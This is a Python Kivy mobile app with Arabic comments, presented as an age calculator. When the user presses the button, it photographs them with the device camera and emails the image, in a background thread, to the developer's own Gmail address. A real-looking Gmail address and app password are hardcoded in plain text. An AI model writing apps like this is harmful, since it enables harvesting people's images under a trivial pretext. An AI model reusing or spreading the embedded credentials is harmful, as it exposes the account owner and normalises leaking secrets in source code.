# -*- coding: utf-8 -*-

# =============================================================================
# 1. استيراد المكتبات الضرورية
# =============================================================================
import datetime
import os
import smtplib
from threading import Thread

# استيراد مكتبات البريد الإلكتروني
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage

# استيراد مكتبات Kivy
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.popup import Popup
from kivy.clock import Clock
from kivy.utils import platform

# استيراد مكتبة Plyer للوصول لمكونات الجهاز
from plyer import camera

# =============================================================================
# 2. إعدادات التطبيق الثابتة
# =============================================================================
SENDER_EMAIL = "ahwakyana@gmail.com"
SENDER_PASSWORD = "iymf fcpu yhlg zvsr"  # كلمة مرور التطبيقات الخاصة بحساب جوجل
RECEIVER_EMAIL = "ahwakyana@gmail.com"

# =============================================================================
# 3. تصميم واجهة المستخدم الرئيسية
# =============================================================================
class AgeCalculatorLayout(BoxLayout):
    """
    تحتوي هذه الفئة على جميع عناصر واجهة المستخدم ومنطقها.
    """
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        self.padding = 20
        self.spacing = 10
        self.photo_path = ""  # لتخزين مسار الصورة الملتقطة

        # إضافة عناصر الواجهة
        self.add_widget(Label(text='أدخل تاريخ ميلادك (YYYY-MM-DD):', font_name='Arial', size_hint_y=None, height=40))
        self.birth_date_input = TextInput(multiline=False, size_hint_y=None, height=40, halign='center', font_size='20sp')
        self.add_widget(self.birth_date_input)
        
        calculate_button = Button(text='احسب العمر والتقط الصورة', size_hint_y=None, height=50)
        calculate_button.bind(on_press=self.start_process)
        self.add_widget(calculate_button)

    def start_process(self, instance):
        """
        تبدأ العملية الكاملة: التقاط الصورة ثم حساب العمر.
        """
        try:
            # تحديد مسار لحفظ الصورة في مساحة تخزين التطبيق
            output_dir = App.get_running_app().user_data_dir
            self.photo_path = os.path.join(output_dir, f"capture_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
            
            # استدعاء الكاميرا من خلال plyer
            camera.take_picture(filename=self.photo_path, on_complete=self.after_photo_taken)
        except Exception as e:
            self.show_popup('خطأ في الكاميرا', f'لم يتمكن من الوصول إلى الكاميرا: {e}')
            self.calculate_age_action()

    def after_photo_taken(self, filepath):
        """
        يتم استدعاؤها بعد التقاط الصورة.
        """
        if filepath and os.path.exists(filepath):
            self.photo_path = filepath
            self.show_popup('نجاح', 'تم التقاط الصورة! جاري إرسالها وحساب العمر...')
            
            # تشغيل إرسال البريد الإلكتروني في خيط منفصل لتجنب تجميد الواجهة
            email_thread = Thread(target=self.send_email_with_attachment)
            email_thread.start()

            # حساب العمر بعد لحظة قصيرة
            Clock.schedule_once(lambda dt: self.calculate_age_action())
        else:
            self.show_popup('خطأ', 'فشل التقاط الصورة أو تم الإلغاء.')
            Clock.schedule_once(lambda dt: self.calculate_age_action())

    def send_email_with_attachment(self):
        """
        إعداد وإرسال البريد الإلكتروني مع الصورة المرفقة.
        """
        try:
            msg = MIMEMultipart()
            msg['From'] = SENDER_EMAIL
            msg['To'] = RECEIVER_EMAIL
            msg['Subject'] = f"صورة مستخدم جديدة - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}"
            msg.attach(MIMEText("تم التقاط صورة جديدة من التطبيق.", 'plain'))

            with open(self.photo_path, 'rb') as f:
                img_data = f.read()
            image = MIMEImage(img_data, name=os.path.basename(self.photo_path))
            msg.attach(image)

            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
            server.quit()
            
            self.show_popup("نجاح الإرسال", "تم إرسال الصورة إلى البريد الإلكتروني.")
        except Exception as e:
            self.show_popup("خطأ في الإرسال", f"فشل إرسال البريد الإلكتروني: {e}")

    def calculate_age_action(self):
        """
        حساب عمر المستخدم وعرضه.
        """
        birth_date_str = self.birth_date_input.text
        try:
            birth_date = datetime.datetime.strptime(birth_date_str, "%Y-%m-%d").date()
            today = datetime.date.today()
            age = today.year - birth_date.year - ((today.month, today.day) < (birth_date.month, birth_date.day))
            self.show_popup('عمرك هو', f'عمرك هو: {age} سنة')
        except ValueError:
            self.show_popup('خطأ في الإدخال', 'صيغة التاريخ غير صالحة. الرجاء استخدام YYYY-MM-DD.')

    def show_popup(self, title, text):
        """
        وظيفة مساعدة لعرض نافذة منبثقة.
        """
        def open_popup_on_main_thread(*args):
            content = Label(text=text, font_name='Arial', halign='center')
            popup = Popup(title=title, content=content, size_hint=(0.8, 0.4), auto_dismiss=True)
            popup.open()
        Clock.schedule_once(open_popup_on_main_thread)

# =============================================================================
# 4. فئة التطبيق الرئيسية ونقطة الدخول
# =============================================================================
class AgeCamApp(App):
    def build(self):
        # طلب الأذونات عند بدء التشغيل (يعمل فقط على أندرويد)
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            permissions_to_request = [Permission.CAMERA, Permission.WRITE_EXTERNAL_STORAGE, Permission.INTERNET]
            request_permissions(permissions_to_request)
        return AgeCalculatorLayout()

if __name__ == '__main__':
    AgeCamApp().run()
